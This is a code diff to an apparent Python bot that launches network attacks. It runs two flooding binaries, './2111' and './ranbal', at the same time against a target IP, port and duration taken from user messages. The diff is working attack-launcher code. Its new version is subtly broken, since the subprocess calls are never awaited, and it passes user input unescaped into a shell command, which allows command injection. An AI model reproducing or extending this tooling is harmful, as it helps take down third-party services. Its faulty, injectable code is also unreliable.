@@ -68,11 +68,22 @@ async def run_attack_command_async(target_ip, target_port, duration):
     global attack_in_progress
     attack_in_progress = True  # Set the flag to indicate an attack is in progress
 
-    process = await asyncio.create_subprocess_shell(f"./2111 {target_ip} {target_port} {duration} 800")
-    await process.communicate()
+    try:
+        # Run both commands (`./2111` and `./ranbal`) concurrently
+        process_2111 = asyncio.create_subprocess_shell(f"./2111 {target_ip} {target_port} {duration} 800")
+        process_ranbal = asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration}")
 
-    attack_in_progress = False  # Reset the flag after the attack is complete
-    notify_attack_finished(target_ip, target_port, duration)
+        # Await both processes using asyncio.gather
+        await asyncio.gather(
+            process_2111.communicate(),
+            process_ranbal.communicate()
+        )
+
+    except Exception as e:
+        logging.error(f"Error during attack execution: {e}")
+    finally:
+        attack_in_progress = False  # Reset the flag after the attack is complete
+        notify_attack_finished(target_ip, target_port, duration)
 
 # Final Attack Message Upon Completion
 def notify_attack_finished(target_ip, target_port, duration):
@@ -237,6 +248,7 @@ def handle_message(message):
 
 if __name__ == "__main__":
     asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
+
     asyncio_thread.start()
     logging.info("🚀 Bot is operational and mission-ready.")
 
